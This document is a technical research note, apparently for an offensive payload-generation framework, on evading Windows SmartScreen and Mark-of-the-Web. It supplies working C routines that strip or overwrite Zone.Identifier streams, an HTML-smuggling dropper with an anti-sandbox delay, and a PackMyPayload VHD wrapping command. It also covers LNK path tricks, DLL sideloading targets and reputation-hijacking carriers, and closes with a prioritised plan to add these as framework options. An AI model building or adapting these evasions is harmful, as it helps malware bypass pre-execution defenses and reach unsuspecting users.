# Windows SmartScreen & Mark of the Web (MOTW) Evasion Research

## Overview

Windows SmartScreen and Smart App Control (SAC) are reputation-based security features that gate execution of untrusted binaries. SmartScreen checks files tagged with the Mark of the Web (MOTW) — a Zone.Identifier alternate data stream (ADS) applied to files downloaded from the internet (ZoneId=3). If the file lacks reputation in Microsoft's cloud database, the user gets a warning or outright block.

**Kill chain position**: SmartScreen is a **pre-execution** gate. Bypassing it is required before any evasion/payload logic matters. EDR (CrowdStrike, Elastic) operates post-execution. These are complementary, not redundant — you need to beat both.

**Detection pipeline**:
```
Download → MOTW applied → SmartScreen/SAC check → Execution → EDR behavioral analysis
                ↑ bypass here                        ↑ our existing evasion dims handle this
```

---

## 1. Container File Format Bypass

### How It Works
MOTW is an NTFS Alternate Data Stream. File systems inside container formats (ISO, VHD, IMG) are not NTFS, so files extracted/mounted from them don't inherit the Zone.Identifier ADS.

### Technique Details

| Format | Status (2025-2026) | Notes |
|--------|-------------------|-------|
| **ISO** | Partially patched (Nov 2022) | Windows now propagates MOTW to some ISO contents on modern builds. Some edge cases still bypass. |
| **VHD/VHDX** | **Still working** | Windows mounts VHDs as drives. Inner files have no MOTW. Primary current vector. |
| **IMG** | **Still working** | Same mechanism as VHD. Less commonly blocked by email gateways. |
| **Encrypted ZIP** | **Working** (7-Zip, WinRAR) | 7-Zip only recently added opt-in MOTW propagation. Many users still on older versions. |

### Implementation (C)
```c
// No C code needed — this is a delivery mechanism.
// PackMyPayload (Python) can wrap any EXE into VHD:
// python PackMyPayload.py payload.exe -o delivery.vhd -t vhd
//
// For framework integration: add a delivery_wrapper dimension
// that controls how the compiled binary is packaged for delivery.
```

### Real-World Usage
- **APT29/Cozy Bear**: ROOTSAW (EnvyScout) HTML smuggling → ISO container → DLL sideload → WINELOADER backdoor (2024)
- **Qakbot**: ISO + LNK file pointing to embedded DLL (2022-2023)
- **Emotet**: Switched from macro-enabled docs to ISO/LNK chain after Microsoft disabled macros (2022)

### Framework Feasibility: **HIGH**
Add as `delivery_wrapper` dimension with options: `none`, `vhd`, `img`, `encrypted_zip`, `html_smuggle`

---

## 2. Zone.Identifier Deletion (Post-Download)

### How It Works
If the payload can execute even briefly (e.g., via a dropper or initial stage), it can delete its own Zone.Identifier ADS before spawning the main payload. The second-stage binary then has no MOTW.

### Implementation (C)
```c
#include <windows.h>

// Method 1: DeleteFile API (used by SmokeLoader)
void remove_motw_deletefile(const char *filepath) {
    char ads_path[MAX_PATH];
    snprintf(ads_path, sizeof(ads_path), "%s:Zone.Identifier", filepath);
    DeleteFileA(ads_path);
}

// Method 2: Overwrite with benign zone (ZoneId=0 = local)
void remove_motw_overwrite(const char *filepath) {
    char ads_path[MAX_PATH];
    snprintf(ads_path, sizeof(ads_path), "%s:Zone.Identifier", filepath);
    HANDLE h = CreateFileA(ads_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        const char *local_zone = "[ZoneTransfer]\r\nZoneId=0\r\n";
        DWORD written;
        WriteFile(h, local_zone, (DWORD)strlen(local_zone), &written, NULL);
        CloseHandle(h);
    }
}

// Method 3: Copy to non-NTFS then back
// Copy file to FAT32 USB/temp drive → Zone.Identifier stripped → copy back
```

### Real-World Usage
- **SmokeLoader**: Calls `DeleteFileW("path:Zone.Identifier")` immediately after dropper execution
- **Various stagers**: Drop payload to `%TEMP%`, delete Zone.Identifier, then execute

### Framework Feasibility: **HIGH**
Add as evasion chunk `evasion/motw_strip.c`. Call in the startup sequence before any sensitive operations.

---

## 3. LNK Stomping (CVE-2024-38217)

### How It Works
Windows Explorer normalizes LNK (shortcut) file paths via `CShellLink::_SaveAsLink()`. When an LNK file has a non-standard target path (trailing dot, space, or relative path), Explorer rewrites it — and the rewrite process strips the MOTW from the target file before SmartScreen checks it.

### Technique Details
```
# Append dot to target path
powershell.exe.

# Use relative path
.\target.exe

# Multi-level path in single LNK array entry
..\..\..\..\target.exe
```

### Patch Status
**Patched September 10, 2024** (CVE-2024-38217). Microsoft modified `_SaveAsLink` to use `SHCreateStreamOnFileEx` with a flag that preserves MOTW. However, this was exploited in the wild since **2018** before the patch.

### Framework Feasibility: **LOW** (patched)
Only useful against unpatched targets. Not worth adding as a primary dimension.

---

## 4. CVE-2023-36025: Internet Shortcut (.URL) Bypass

### How It Works
Specially crafted `.url` (internet shortcut) files could bypass SmartScreen checks entirely. The flaw was in how SmartScreen processed URL files pointing to remote resources.

### Patch Status
**Patched November 14, 2023**. Was exploited as a zero-day before patch.

### Real-World Usage
- **Phemedrone Stealer**: Exploited CVE-2023-36025 for initial access
- Led directly to discovery of CVE-2024-21412

### Framework Feasibility: **LOW** (patched)

---

## 5. CVE-2024-21412: Internet Shortcut Chain Bypass

### How It Works
A bypass of the CVE-2023-36025 patch. Uses a chain of internet shortcut files: victim clicks `.url` file → redirects to another `.url` file on a WebDAV server → that `.url` points to the actual payload. The chain causes MOTW to not propagate.

### Attack Chain
```
Phishing email → PDF with redirect → .url file (SmartScreen bypassed) → 
WebDAV .url file → Payload download (no MOTW) → Execution (no SmartScreen warning)
```

### Patch Status
**Patched February 13, 2024**.

### Real-World Usage
- **Water Hydra APT**: Targeted financial traders with DarkMe RAT
- **DarkGate**: Used fake software installers (iTunes, Notion, NVIDIA) with DDM open redirects

### Framework Feasibility: **LOW** (patched)

---

## 6. Code Signing & Reputation Abuse

### How It Works
SmartScreen uses reputation scoring. Signed binaries with recognized certificates bypass warnings. Several sub-techniques exist:

#### 6a. Legitimate Code Signing Certificates
Purchase or steal a code signing certificate. Standard certs cost $200-700/year from DigiCert/Sectigo. EV (Extended Validation) certs provide immediate trust.

#### 6b. Reputation Hijacking
Use legitimate, well-known executables with good reputation to load malicious code:
- **Lua interpreters** (execute arbitrary Lua scripts)
- **Node.js** (execute arbitrary JS)
- **AutoHotkey** (execute arbitrary AHK scripts with FFI)
- **JamPlus** (build tool with code execution)
- **Python.exe** (execute arbitrary Python)

The signed binary has reputation; the malicious script/DLL does not trigger SmartScreen because SmartScreen only checks the executable, not loaded scripts/DLLs.

#### 6c. Reputation Seeding
Deploy a benign binary first, let it build reputation (~2 hours observed), then weaponize it. SAC is more vulnerable than SmartScreen to this.

#### 6d. Stolen/Cloned Signatures
- **Lazarus Group**: Used stolen 3CX certificate to sign trojanized installer
- **MetaTwin**: Tool to clone digital signatures from trusted Microsoft binaries (invalidates signature but some checks don't verify)

### Patch Status
**Not patchable** — these are systemic weaknesses in reputation-based systems.

### Framework Feasibility: **MEDIUM-HIGH**
- Reputation hijacking: Add `delivery_vehicle` dim with `python`, `node`, `autohotkey`, `lua`, `direct` options
- Code signing: Outside framework scope (requires actual certs)
- DLL sideloading: Already partially implemented via `process=dll_sideload`

---

## 7. DLL Sideloading (SmartScreen Context)

### How It Works
SmartScreen checks the main executable, not DLLs it loads. By using a signed, trusted EXE that loads a DLL from its directory, the malicious DLL executes in a trusted process context without SmartScreen intervention.

### Known Sideloading Targets
| Signed Binary | Missing DLL | Notes |
|--------------|-------------|-------|
| msdtc.exe | winmm.dll | Microsoft signed |
| OneDriveStandaloneUpdater.exe | version.dll | Microsoft signed |
| Teams.exe | dbghelp.dll | Microsoft signed |
| RuntimeBroker.exe | various | System process |

### Windows DLL Search Order (exploitation point)
1. **Application directory** ← attacker drops DLL here
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Current working directory
6. System PATH

### Discovery Method
Use Process Monitor, filter for `CreateFile` → `NAME NOT FOUND` on `.dll` files from signed binaries.

### Framework Feasibility: **HIGH**
Already have `process=dll_sideload` dimension. Could expand with specific target binaries as sub-options.

---

## 8. HTML Smuggling

### How It Works
Instead of sending an executable directly (which gets MOTW), embed the payload as base64 in an HTML file. JavaScript in the HTML assembles the binary client-side in the browser, then triggers a download. The assembled file may or may not get MOTW depending on browser behavior.

### Implementation
```javascript
// Simplified HTML smuggling payload
var binary = atob("TVqQAAMAAAA...");  // base64-encoded EXE
var blob = new Blob([Uint8Array.from(binary, c => c.charCodeAt(0))]);
var url = URL.createObjectURL(blob);
var a = document.createElement('a');
a.href = url;
a.download = 'update.exe';
// Add anti-sandbox delay
setTimeout(() => a.click(), 7000);
```

### Real-World Usage
- **APT29**: ROOTSAW/EnvyScout dropper → HTML smuggling → ISO container
- **Qakbot**: HTML → password-protected ZIP → ISO → LNK → DLL

### Framework Feasibility: **MEDIUM**
Delivery mechanism, not a compiled C technique. Could add as a delivery wrapper option alongside VHD/ISO.

---

## 9. WebDAV Mount Bypass

### How It Works
Files accessed via WebDAV shares mounted as Windows drives don't consistently receive MOTW. Before June 2024 patches, copy-paste from WebDAV shares didn't apply MOTW at all.

### Patch Status
**Partially patched June 2024**. Some edge cases may remain.

### Framework Feasibility: **LOW**
Requires attacker-controlled WebDAV infrastructure. Not a binary-level technique.

---

## 10. Reputation Tampering (Smart App Control)

### How It Works
SAC uses fuzzy hashing or ML-based similarity matching rather than strict cryptographic hashing. Attackers can modify specific code sections (embed shellcode) while maintaining the file's reputation score.

### Patch Status
**Not patched** — fundamental design weakness in SAC's ML model.

### Framework Feasibility: **MEDIUM**
Could implement as an obfuscation technique that preserves binary similarity to a known-good template.

---

## Implementation Priority for Framework

### Tier 1: Implement Now (High value, working techniques)
1. **Zone.Identifier deletion** — `evasion/motw_strip.c` chunk. Call `DeleteFileA("path:Zone.Identifier")` in startup. Cost: trivial.
2. **VHD/IMG container wrapper** — Post-compilation packaging step. `delivery_wrapper` dimension.
3. **DLL sideloading expansion** — Add known sideloading target binaries to the `process=dll_sideload` config.

### Tier 2: Implement Soon (Medium value)
4. **HTML smuggling template** — JavaScript dropper template for delivery. Not C code.
5. **Reputation hijacking** — Package payload as script for AutoHotkey/Lua/Python delivery vehicles.
6. **Zone overwrite** — Instead of deleting Zone.Identifier, overwrite with `ZoneId=0` (local machine). Less suspicious than deletion.

### Tier 3: Research More (Lower value or patched)
7. **Reputation seeding** — Deploy benign binary first, weaponize after 2h. Complex logistics.
8. **Reputation tampering** — Modify binary to maintain fuzzy hash similarity. Requires reverse-engineering SAC's model.
9. **LNK stomping** — Patched but useful against unpatched targets.

---

## New Framework Dimensions Proposed

### `motw_bypass` (SmartScreen/MOTW evasion)
| Option | Technique | Risk | Notes |
|--------|-----------|------|-------|
| `none` | No MOTW bypass | high | SmartScreen blocks on download |
| `delete_ads` | DeleteFile Zone.Identifier | low | SmokeLoader technique, simple |
| `overwrite_zone` | Set ZoneId=0 | very_low | Less suspicious than deletion |
| `self_extract_fat` | Copy to FAT32 temp, strips ADS | low | Requires removable drive |

### `delivery_wrapper` (Binary packaging for delivery)
| Option | Technique | Risk | Notes |
|--------|-----------|------|-------|
| `none` | Direct EXE | high | Full MOTW + SmartScreen |
| `vhd` | VHD container | low | Still working 2025+ |
| `img` | IMG container | low | Similar to VHD |
| `encrypted_zip` | Password-protected ZIP | medium | Depends on extraction tool |
| `html_smuggle` | HTML + JS assembly | low | Bypasses email gateways too |

### `delivery_vehicle` (Reputation hijacking carrier)
| Option | Technique | Risk | Notes |
|--------|-----------|------|-------|
| `direct` | Execute binary directly | high | Full SmartScreen check |
| `autohotkey` | AHK script + signed AHK.exe | very_low | FFI capable, good reputation |
| `python` | Python script + python.exe | low | Ubiquitous, good reputation |
| `dll_sideload` | Trusted EXE + malicious DLL | very_low | SmartScreen only checks EXE |

---

## Sources

- [Dismantling Smart App Control — Elastic Security Labs](https://www.elastic.co/security-labs/dismantling-smart-app-control)
- [Mark of the Web Bypass — Red Canary Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/)
- [Initial Access: Modern Intrusion Techniques — DbgMan](https://0xdbgman.github.io/posts/initial-access-the-art-of-getting-in/)
- [CVE-2024-21412 Facts and Fixes — Trend Micro](https://www.trendmicro.com/en_us/research/24/b/cve-2024-21412-facts-and-fixes.html)
- [CVE-2023-36025 Analysis — Huntress](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-36025)
- [LNK Stomping Technique — ASEC AhnLab](https://asec.ahnlab.com/en/90299/)
- [LNK Stomping Micropatches — 0patch](https://blog.0patch.com/2024/11/micropatches-for-lnk-stomping-windows.html)
- [How Malware Abuses Zone Identifier — SecurityLiterate](https://securityliterate.com/how-malware-abuses-the-zone-identifier-to-circumvent-detection-and-analysis/)
- [SmartScreen Reputation for Developers — Microsoft Learn](https://learn.microsoft.com/en-us/windows/apps/package-and-deploy/smartscreen-reputation)
- [MITRE ATT&CK T1553.005 — Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005/)
- [DarkGate AutoHotkey SmartScreen Bypass — CyberInsider](https://cyberinsider.com/darkgate-malware-leverages-autohotkey-to-bypass-smartscreen/)
- [SmartScreen Bypass Copy-Paste ISO — AFine](https://afine.com/microsoft-defender-smartscreen-bypass-with-copy-paste-from-iso/)
